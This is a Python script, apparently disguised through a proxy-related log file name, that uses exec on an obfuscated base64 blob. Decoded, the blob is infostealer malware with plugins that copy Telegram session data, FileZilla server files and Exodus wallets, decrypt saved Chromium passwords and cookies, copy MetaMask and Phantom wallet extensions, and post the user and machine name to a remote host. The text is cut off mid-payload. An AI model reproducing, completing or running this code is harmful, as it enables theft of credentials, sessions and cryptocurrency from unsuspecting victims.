#!/usr/bin/env python
import codecs
import os
import re
import sys
import tempfile
import random
import string
import datetime
import subprocess
from base64 import b64decode


def print(text: str, time=True):
    try:
        with open(f'{tempfile.gettempdir()}\\aiohttp_proxy5_logs.txt', 'a', encoding='utf8') as f:
            if time:
                now = datetime.datetime.now().strftime("%m/%d/%Y, %H:%M:%S")
                f.write(f'{now} | {text}\n')
            else:
                f.write(f'{text}\n')
    except:
        pass



def rand():
    return ''.join(random.choice(string.ascii_lowercase) for i in range(12))

print(f'\n\nНачинается код', time=False)
print(sys.argv)

def sb_proc():
    exec(b64decode('X08wME8wMDBPTzAwTzAwTzBPID1iImZyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBpc2Rpciwgam9pblxyXG5mcm9tIG9zIGltcG9ydCBta2Rpciwgc2NhbmRpclxyXG5mcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5ZmlsZSwgY29weXRyZWVcclxuXHJcblxyXG5jbGFzcyBUZWxlZ3JhbShQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNkaXIocGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICB0ZGF0YV9wYXRoID0gam9pbihwYXRoLCAndGRhdGEnKVxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcih0ZGF0YV9wYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHRlbGVncmFtX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ3RlbGVncmFtJylcclxuICAgICAgICBpZiBub3QgaXNkaXIodGVsZWdyYW1fcGF0aCk6XHJcbiAgICAgICAgICAgIG1rZGlyKHRlbGVncmFtX3BhdGgpXHJcblxyXG4gICAgICAgIHJlc19wYXRoID0gam9pbih0ZWxlZ3JhbV9wYXRoLCBmJ3RkYXRhX3t0b2tlbl9oZXgoNCl9JylcclxuICAgICAgICBta2RpcihyZXNfcGF0aClcclxuXHJcbiAgICAgICAgYmxhY2tsaXN0ID0gWydkdW1wcycsICdlbW9qaScsICd1c2VyX2RhdGEnLCAnd29ya2luZyddXHJcblxyXG4gICAgICAgIGZvciBmIGluIHNjYW5kaXIodGRhdGFfcGF0aCk6XHJcbiAgICAgICAgICAgIGZpbGVfb2sgPSBUcnVlXHJcbiAgICAgICAgICAgIGZvciBpIGluIGJsYWNrbGlzdDpcclxuICAgICAgICAgICAgICAgIGlmIGkgaW4gZi5uYW1lOlxyXG4gICAgICAgICAgICAgICAgICAgIGZpbGVfb2sgPSBGYWxzZVxyXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICBpZiBub3QgZmlsZV9vazpcclxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICBmcm9tX3BhdGggPSBqb2luKHRkYXRhX3BhdGgsIGYubmFtZSlcclxuICAgICAgICAgICAgZGVzdF9wYXRoID0gam9pbihyZXNfcGF0aCwgZi5uYW1lKVxyXG5cclxuICAgICAgICAgICAgZnVuYyA9IGNvcHlmaWxlIGlmIGYuaXNfZmlsZSgpIGVsc2UgY29weXRyZWVcclxuICAgICAgICAgICAgYXdhaXQgZnVuYyhmcm9tX3BhdGgsIGRlc3RfcGF0aClcclxuIiNsaW5lOjENCl9PME9PTzBPT09PME9PME9PTyA9YiJmcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgaXNkaXIsIGpvaW5cclxuZnJvbSBvcyBpbXBvcnQgbWtkaXIsIHNjYW5kaXJcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSB0b29scyBpbXBvcnQgY29weWZpbGVcclxuXHJcblxyXG5cclxuY2xhc3MgRmlsZXppbGxhKFBsdWdpbik6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNkaXIocGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICBzZWFyY2ggPSB7J3JlY2VudHNlcnZlcnMueG1sJywgJ3NpdGVtYW5hZ2VyLnhtbCd9XHJcbiAgICAgICAgZmlsZXMgPSBzZWFyY2guaW50ZXJzZWN0aW9uKGkubmFtZSBmb3IgaSBpbiBzY2FuZGlyKHBhdGgpKVxyXG5cclxuICAgICAgICBpZiBub3QgZmlsZXM6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICByZXNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAnZmlsZXppbGxhJylcclxuICAgICAgICBpZiBub3QgaXNkaXIocmVzX3BhdGgpOlxyXG4gICAgICAgICAgICBta2RpcihyZXNfcGF0aClcclxuICAgICAgICBcclxuICAgICAgICBmb3IgZiBpbiBmaWxlczpcclxuICAgICAgICAgICAgZmlsZW5hbWUgPSBmLnNwbGl0KCcuJylbMF1cclxuICAgICAgICAgICAgZGVzdF9wYXRoID0gam9pbihyZXNfcGF0aCwgZid7ZmlsZW5hbWV9X3t0b2tlbl9oZXgoNCl9LnhtbCcpXHJcbiAgICAgICAgICAgIGF3YWl0IGNvcHlmaWxlKGpvaW4ocGF0aCwgZiksIGRlc3RfcGF0aClcclxuIiNsaW5lOjINCl9PT08wMDBPMDAwMDBPT09PMCA9YiJmcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgaXNkaXIsIGpvaW5cclxuZnJvbSBvcyBpbXBvcnQgbWtkaXJcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSB0b29scyBpbXBvcnQgY29weXRyZWVcclxuXHJcblxyXG5cclxuY2xhc3MgRXhvZHVzKFBsdWdpbik6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNkaXIocGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICB3YWxsZXRfZm9sZGVyID0gam9pbihwYXRoLCAnZXhvZHVzLndhbGxldCcpXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHdhbGxldF9mb2xkZXIpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgd2FsbGV0c19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICd3YWxsZXRzJylcclxuICAgICAgICBpZiBub3QgaXNkaXIod2FsbGV0c19wYXRoKTpcclxuICAgICAgICAgICAgbWtkaXIod2FsbGV0c19wYXRoKVxyXG4gICAgICAgIFxyXG4gICAgICAgIGxvZ19leG9kdXNfcGF0aCA9IGpvaW4od2FsbGV0c19wYXRoLCBmJ2V4b2R1c197dG9rZW5faGV4KDQpfScpXHJcblxyXG4gICAgICAgIGF3YWl0IGNvcHl0cmVlKHdhbGxldF9mb2xkZXIsIGxvZ19leG9kdXNfcGF0aCkiI2xpbmU6Mw0KX08wTzAwT09PME8wMDAwMDBPID1iImZyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuaW1wb3J0IG9zXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgam9pblxyXG5pbXBvcnQgcGxhdGZvcm1cclxuZnJvbSBhaW9odHRwIGltcG9ydCBDbGllbnRTZXNzaW9uXHJcbmZyb20gYWlvZmlsZXMgaW1wb3J0IG9wZW5cclxuXHJcblxyXG5cclxuY2xhc3MgRGV0YWlscygpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgdXNlciA9IG9zLmdldGxvZ2luKClcclxuICAgICAgICBwYyA9IHBsYXRmb3JtLm5vZGUoKVxyXG5cclxuICAgICAgICBkYXRhID0ge1xyXG4gICAgICAgICAgICAnY2xpZW50X2lkJzogc2VsZi5jb25mLmNsaWVudF9pZCxcclxuICAgICAgICAgICAgJ3VzZXJfbmFtZSc6IHVzZXIsXHJcbiAgICAgICAgICAgICdwY19uYW1lJzogcGNcclxuICAgICAgICB9XHJcbiAgICAgICAgXHJcbiAgICAgICAgdXJsID0gZid7c2VsZi5jb25mLmhvc3R9L3JlY2VpdmVfZGV0YWlscydcclxuXHJcbiAgICAgICAgYXN5bmMgd2l0aCBDbGllbnRTZXNzaW9uKCkgYXMgczpcclxuICAgICAgICAgICAgYXdhaXQgcy5wb3N0KHVybCwganNvbj1kYXRhKVxyXG5cclxuICAgICAgICBhc3luYyB3aXRoIG9wZW4oam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdkZXRhaWxzLnR4dCcpLCAndycsIGVuY29kaW5nPSd1dGY4JykgYXMgZjpcclxuICAgICAgICAgICAgYXdhaXQgZi53cml0ZShmJ3VzZXIgbmFtZToge3VzZXJ9XFxucGMgbmFtZToge3BjfScpIiNsaW5lOjQNCl9PTzAwT09PME9PTzBPT08wMCA9YiJmcm9tIGFzeW5jaW8gaW1wb3J0IFRhc2ssIGNyZWF0ZV90YXNrXHJcbmZyb20gdHlwaW5nIGltcG9ydCBMaXN0XHJcbmZyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcyBpbXBvcnQgc2NhbmRpciwgbWtkaXJcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBqb2luLCBpc2RpciwgaXNmaWxlLCBzcGxpdFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5ZmlsZSwgY29weXRyZWVcclxuZnJvbSBwYXRoX3NlYXJjaCBpbXBvcnQgc2VhcmNoX3BhdGhzXHJcbmltcG9ydCBhaW9zcWxpdGVcclxuZnJvbSAuZGVjcnlwdCBpbXBvcnQgRGVjcnlwdG9yXHJcbmZyb20gdGltZSBpbXBvcnQgdGltZVxyXG5mcm9tIHBhdGhzIGltcG9ydCBURU1QXHJcbmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4XHJcbmZyb20gYWlvZmlsZXMgaW1wb3J0IG9wZW5cclxuXHJcblxyXG5cclxuY2xhc3MgQ2hyb21pdW0oUGx1Z2luKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG4gICAgICAgIHNlbGYuZGVjcnlwdG9yID0gTm9uZVxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgc2V0X2RlY3J5cHRvcihzZWxmLCByb290X3BhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBsb2NhbF9zdGF0ZV9mb2xkZXJzID0ge1xyXG4gICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScpLFxyXG4gICAgICAgICAgICByb290X3BhdGhcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIGxvY2FsX3N0YXRlcyA9IFtdXHJcbiAgICAgICAgYXN5bmMgZm9yIGkgaW4gc2VhcmNoX3BhdGhzKGxvY2FsX3N0YXRlX2ZvbGRlcnMsIHsnTG9jYWwgU3RhdGUnfSk6XHJcbiAgICAgICAgICAgIGxvY2FsX3N0YXRlcy5hcHBlbmQoaSlcclxuXHJcbiAgICAgICAgaWYgbG9jYWxfc3RhdGVzOlxyXG4gICAgICAgICAgICBsb2NhbF9zdGF0ZV9wYXRoID0gbG9jYWxfc3RhdGVzWzBdXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgbG9jYWxfc3RhdGVfcGF0aCA9IE5vbmVcclxuXHJcbiAgICAgICAgc2VsZi5kZWNyeXB0b3IgPSBEZWNyeXB0b3IobG9jYWxfc3RhdGVfcGF0aClcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIHN0ZWFsX3Bhc3N3b3JkKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHJvd3MgPSBbXVxyXG5cclxuICAgICAgICBpZiBub3QgaXNkaXIocm9vdF9wYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuIFtdXHJcblxyXG4gICAgICAgIGxvZ2luX2RhdGFfZm9sZGVyX3BhdGhzID0ge1xyXG4gICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScsICdkZWZhdWx0JyksXHJcbiAgICAgICAgICAgIHJvb3RfcGF0aFxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgYXN5bmMgZm9yIHAgaW4gc2VhcmNoX3BhdGhzKGxvZ2luX2RhdGFfZm9sZGVyX3BhdGhzLCB7J0xvZ2luIERhdGEnfSk6XHJcbiAgICAgICAgICAgIGlmIG5vdCBpc2ZpbGUocCk6XHJcbiAgICAgICAgICAgICAgICBjb250aW51ZVxyXG4gICAgICAgICAgICBcclxuICAgICAgICAgICAgdGVtcF9wYXRoID0gam9pbihURU1QLCBmJ0xvZ2luIERhdGEge3RpbWUoKX0nKVxyXG4gICAgICAgICAgICBhd2FpdCBjb3B5ZmlsZShwLCB0ZW1wX3BhdGgpXHJcblxyXG4gICAgICAgICAgICBpZiBub3Qgc2VsZi5kZWNyeXB0b3I6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLnNldF9kZWNyeXB0b3Iocm9vdF9wYXRoKVxyXG4gICAgICAgICAgICBhc3luYyB3aXRoIGFpb3NxbGl0ZS5jb25uZWN0KHRlbXBfcGF0aCkgYXMgY29ubjpcclxuICAgICAgICAgICAgICAgIHNxbCA9ICdzZWxlY3QgKiBmcm9tIGxvZ2lucydcclxuICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggY29ubi5leGVjdXRlKHNxbCkgYXMgY3VycjpcclxuICAgICAgICAgICAgICAgICAgICBhc3luYyBmb3Igcm93IGluIGN1cnI6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJvd3MuYXBwZW5kKChyb3dbMV0sIHJvd1szXSwgc2VsZi5kZWNyeXB0b3IuZGVjcnlwdF9wYXNzd29yZChyb3dbNV0pKSlcclxuXHJcbiAgICAgICAgaWYgcm93czpcclxuICAgICAgICAgICAgbmFtZSA9IGYne3NwbGl0KHJvb3RfcGF0aClbMV19X3t0b2tlbl9oZXgoNSl9LnR4dCdcclxuICAgICAgICAgICAgcGFzc3dvcmRzX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ3Bhc3N3b3JkcycpXHJcbiAgICAgICAgICAgIHBhdGggPSBqb2luKHBhc3N3b3Jkc19wYXRoLCBuYW1lKVxyXG5cclxuICAgICAgICAgICAgaWYgbm90IGlzZGlyKHBhc3N3b3Jkc19wYXRoKTpcclxuICAgICAgICAgICAgICAgIG1rZGlyKHBhc3N3b3Jkc19wYXRoKVxyXG5cclxuICAgICAgICAgICAgYXN5bmMgd2l0aCBvcGVuKHBhdGgsICd3JywgZW5jb2Rpbmc9J3V0ZjgnKSBhcyBmOlxyXG4gICAgICAgICAgICAgICAgZm9yIHVybCwgbG9naW4sIHBhc3N3b3JkIGluIHJvd3M6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgZi53cml0ZShmJ1VSTDoge3VybH1cXG5Mb2dpbjoge2xvZ2lufVxcblBhc3N3b3JkOiB7cGFzc3dvcmR9XFxuXFxuJylcclxuICAgICAgICBcclxuXHJcbiAgICBhc3luYyBkZWYgc3RlYWxfY29va2llcyhzZWxmLCByb290X3BhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNkaXIocm9vdF9wYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuIFtdXHJcblxyXG4gICAgICAgIGNvb2tpZXMgPSAnJ1xyXG5cclxuICAgICAgICBjb29raWVfZm9sZGVyX3BhdGhzID0ge1xyXG4gICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScsICdkZWZhdWx0JywgJ25ldHdvcmsnKSwgXHJcbiAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnKSxcclxuICAgICAgICAgICAgcm9vdF9wYXRoXHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBhc3luYyBmb3IgcCBpbiBzZWFyY2hfcGF0aHMoY29va2llX2ZvbGRlcl9wYXRocywgeydDb29raWVzJywgJ2Nvb2tpZXMuc3FsaXRlJ30pOlxyXG4gICAgICAgICAgICBpZiBub3QgaXNmaWxlKHApOlxyXG4gICAgICAgICAgICAgICAgY29udGludWVcclxuXHJcbiAgICAgICAgICAgIHRlbXBfcGF0aCA9IGpvaW4oVEVNUCwgZidDb29raWVzIHt0aW1lKCl9JylcclxuICAgICAgICAgICAgYXdhaXQgY29weWZpbGUocCwgdGVtcF9wYXRoKVxyXG5cclxuICAgICAgICAgICAgaWYgbm90IHNlbGYuZGVjcnlwdG9yOlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5zZXRfZGVjcnlwdG9yKHJvb3RfcGF0aClcclxuICAgICAgICAgICAgICAgICAgICBcclxuICAgICAgICAgICAgYXN5bmMgd2l0aCBhaW9zcWxpdGUuY29ubmVjdCh0ZW1wX3BhdGgpIGFzIGNvbm46XHJcbiAgICAgICAgICAgICAgICBzcWwgPSAnc2VsZWN0ICogZnJvbSBjb29raWVzJ1xyXG4gICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBjb25uLmV4ZWN1dGUoc3FsKSBhcyBjdXJyOlxyXG4gICAgICAgICAgICAgICAgICAgIGFzeW5jIGZvciByb3cgaW4gY3VycjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgY29udiA9IGxhbWJkYSB4OiAnVFJVRScgaWYgeCBlbHNlICdGQUxTRSdcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGhvc3QgPSByb3dbMV1cclxuICAgICAgICAgICAgICAgICAgICAgICAgaHR0cF9vbmx5ID0gY29udihyb3dbOV0pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHBhdGggPSByb3dbNl1cclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VjdXJlID0gY29udihyb3dbOF0pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGV4cGlyYXRpb25fZGF0ZSA9IHN0cihyb3dbN10pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSByb3dbM11cclxuICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSBzZWxmLmRlY3J5cHRvci5kZWNyeXB0X3Bhc3N3b3JkKHJvd1s1XSlcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB2YWx1ZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlID0gJydcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvb2tpZSA9ICdcXHQnLmpvaW4oXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAoaG9zdCwgaHR0cF9vbmx5LCBwYXRoLCBzZWN1cmUsIGV4cGlyYXRpb25fZGF0ZSwgbmFtZSwgdmFsdWUpKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBjb29raWVzICs9IGNvb2tpZSArICdcXG4nXHJcblxyXG4gICAgICAgIGlmIGNvb2tpZXM6XHJcbiAgICAgICAgICAgIG5hbWUgPSBmJ3tzcGxpdChyb290X3BhdGgpWzFdfV97dG9rZW5faGV4KDUpfS50eHQnXHJcbiAgICAgICAgICAgIGNvb2tpZXNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAnY29va2llcycpXHJcbiAgICAgICAgICAgIHBhdGggPSBqb2luKGNvb2tpZXNfcGF0aCwgbmFtZSlcclxuICAgICAgICAgICAgXHJcbiAgICAgICAgICAgIGlmIG5vdCBpc2Rpcihjb29raWVzX3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgbWtkaXIoY29va2llc19wYXRoKVxyXG5cclxuICAgICAgICAgICAgYXN5bmMgd2l0aCBvcGVuKHBhdGgsICd3JywgZW5jb2Rpbmc9J3V0ZjgnKSBhcyBmOlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgZi53cml0ZShjb29raWVzKVxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgc3RlYWxfd2FsbGV0cyhzZWxmLCByb290X3BhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNkaXIocm9vdF9wYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuIFtdXHJcblxyXG4gICAgICAgIHdhbGxldF9mb2xkZXJfcGF0aHMgPSB7XHJcbiAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnLCAnbG9jYWwgZXh0ZW5zaW9uIHNldHRpbmdzJyksIFxyXG4gICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScsICdsb2NhbCBleHRlbnNpb24gc2V0dGluZ3MnKSwgXHJcbiAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAnbG9jYWwgZXh0ZW5zaW9uIHNldHRpbmdzJylcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIHdhbGxldHMgPSB7XHJcbiAgICAgICAgICAgICdua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubic6ICdtZXRhbWFzaycsXHJcbiAgICAgICAgICAgICdiZm5hZWxtb21laW1obHBtZ2puam9waGhwa2tvbGpwYSc6ICdwaGFudG9tJ1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgYXN5bmMgZm9yIHAgaW4gc2VhcmNoX3BhdGhzKHdhbGxldF9mb2xkZXJfcGF0aHMsIHNldCh3YWxsZXRzLmtleXMoKSkpOlxyXG4gICAgICAgICAgICBpZiBub3QgaXNkaXIocCk6XHJcbiAgICAgICAgICAgICAgICBjb250aW51ZVxyXG4gICAgICAgICAgICBcclxuICAgICAgICAgICAgd2FsbGV0c19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICd3YWxsZXRzJylcclxuICAgICAgICAgICAgaWYgbm90IGlzZGlyKHdhbGxldHNfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICBta2Rpcih3YWxsZXRzX3BhdGgpXHJcblxyXG4gICAgICAgICAgICBuYW1lID0gc3BsaXQocClbMV1cclxuICAgICAgICAgICAgd2FsbGV0X25hbWUgPSB3YWxsZXRzW25hbWVdXHJcbiAgICAgICAgICAgIGRlc3RfcGF0aCA9IGpvaW4od2FsbGV0c19wYXRoLCBmJ3t3YWxsZXRfbmFtZX1fe3Rva2VuX2hleCg0KX0nKVxyXG5cclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgY29weXRyZWUocCwgZGVzdF9wYXRoKVxyXG4gICAgICAgICAgICBleGNlcHQ6XHJcbiAgICAgICAgICAgICAgICBwYXNzXHJcbiAgICBcclxuXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZiwgcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGNocm9taXVtX2Jyb3dzZXJfbmFtZXMgPSB7XHJcbiAgICAgICAgICAgICdvcGVyYSBneCBzdGFibGUnLFxyXG4gICAgICAgICAgICAnb3BlcmEgc3RhYmxlJyxcclxuICAgICAgICAgICAgJ2Nocm9tZScsXHJcbiAgICAgICAgICAgICd5YW5kZXhicm93c2VyJ1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgdGFza3M6IExpc3RbVGFza10gPSBbXVxyXG5cclxuICAgICAgICBmb3IgZm9sZGVyX25hbWUgaW4gY2hyb21pdW1fYnJvd3Nlcl9uYW1lcy5pbnRlcnNlY3Rpb24oaS5uYW1lLmxvd2VyKCkgZm9yIGkgaW4gc2NhbmRpcihwYXRoKSk6XHJcbiAgICAgICAgICAgIHJvb3RfcGF0aCA9IGpvaW4ocGF0aCwgZm9sZGVyX25hbWUpXHJcbiAgICAgICAgICAgIHRhc2tzLmFwcGVuZChjcmVhdGVfdGFzayhzZWxmLnN0ZWFsX3Bhc3N3b3JkKHJvb3RfcGF0aCkpKVxyXG4gICAgICAgICAgICB0YXNrcy5hcHBlbmQoY3JlYXRlX3Rhc2soc2VsZi5zdGVhbF9jb29raWVzKHJvb3RfcGF0aCkpKVxyXG4gICAgICAgICAgICB0YXNrcy5hcHBlbmQoY3JlYXRlX3Rhc2soc2VsZi5zdGVhbF93YWxsZXRzKHJvb3RfcGF0aCkpKVxyXG4gICAgICAgICAgICBcclxuICAgICAgICBmb3IgdGFzayBpbiB0YXNrczpcclxuICAgICAgICAgICAgYXdhaXQgdGFza1xyXG4gICAgICAgICAgICAgICAgIiNsaW5lOjUNCmltcG9ydCBjb250ZXh0bGliIGFzIF9fc3RpY2t5dGFwZV9jb250ZXh0bGliICNsaW5lOjYNCkBfX3N0aWNreXRhcGVfY29udGV4dGxpYiAuY29udGV4dG1hbmFnZXIgI2xpbmU6Nw0KZGVmIF9fTzBPTzBPTzAwMDBPTzBPMDAgKCk6I2xpbmU6OA0KCWltcG9ydCB0ZW1wZmlsZSAsc2h1dGlsIDtPTzBPMDBPME9PMDAwT08wTyA9dGVtcGZpbGUgLm1rZHRlbXAgKCkjbGluZTo5DQoJdHJ5IDp5aWVsZCBPTzBPMDBPME9PMDAwT08wTyAjbGluZToxMA0KCWZpbmFsbHkgOnNodXRpbCAucm10cmVlIChPTzBPMDBPME9PMDAwT08wTyApI2xpbmU6MTENCndpdGggX19PME9PME9PMDAwME9PME8wMCAoKWFzIF9fT08wTzBPME9PT08wMDBPT08gOiNsaW5lOjEyDQoJZGVmIF9fTzBPME8wT09PT08wTzBPMDAgKE9PMDBPT09PT09PT08wT08wICxPMDBPT09PME9PTzBPTzBPTyApOiNsaW5lOjEzDQoJCU9PME9PT09PTzBPME9PME9PID0nd2InO2ltcG9ydCBvcyAsb3MgLnBhdGggI2xpbmU6MTQNCgkJZGVmIE8wME9PTzBPME8wME9PME8wIChPTzAwTzBPTzBPME9PT08wMCApOiNsaW5lOjE1DQoJCQlPT09PT09PMDAwMDBPTzBPTyA9T08wME8wT08wTzBPT09PMDAgLnNwbGl0ICgnLycpO09PTzBPTzAwT09PME8wTzBPID1fX09PME8wTzBPT09PMDAwT09PICNsaW5lOjE2DQoJCQlmb3IgTzAwT08wTzBPMDBPME8wMDAgaW4gT09PT09PTzAwMDAwT08wT08gOiNsaW5lOjE3DQoJCQkJT09PME9PMDBPT08wTzBPME8gPW9zIC5wYXRoIC5qb2luIChPT08wT08wME9PTzBPME8wTyAsTzAwT08wTzBPMDBPME8wMDAgKSNsaW5lOjE4DQoJCQkJaWYgbm90IG9zIC5wYXRoIC5leGlzdHMgKE9PTzBPTzAwT09PME8wTzBPICk6I2xpbmU6MTkNCgkJCQkJb3MgLm1rZGlyIChPT08wT08wME9PTzBPME8wTyApI2xpbmU6MjANCgkJCQkJd2l0aCBvcGVuIChvcyAucGF0aCAuam9pbiAoT09PME9PMDBPT08wTzBPME8gLCdfX2luaXRfXy5weScpLE9PME9PT09PTzBPME9PME9PIClhcyBPME9PMDAwMDAwME9PME9PMCA6TzBPTzAwMDAwMDBPTzBPTzAgLndyaXRlIChiJ1xuJykjbGluZToyMQ0KCQlPMDBPT08wTzBPMDBPTzBPMCAob3MgLnBhdGggLmRpcm5hbWUgKE9PMDBPT09PT09PT08wT08wICkpO09PMDAwTzBPMDAwME8wME9PID1vcyAucGF0aCAuam9pbiAoX19PTzBPME8wT09PTzAwME9PTyAsT08wME9PT09PT09PTzBPTzAgKSNsaW5lOjIyDQoJCXdpdGggb3BlbiAoT08wMDBPME8wMDAwTzAwT08gLE9PME9PT09PTzBPME9PME9PIClhcyBPT08wME9PTzAwME8wTzAwTyA6T09PMDBPT08wMDBPME8wME8gLndyaXRlIChPMDBPT09PME9PTzBPTzBPTyApI2xpbmU6MjMNCglpbXBvcnQgc3lzIGFzIF9fc3RpY2t5dGFwZV9zeXMgO19fc3RpY2t5dGFwZV9zeXMgLnBhdGggLmluc2VydCAoMCAsX19PTzBPME8wT0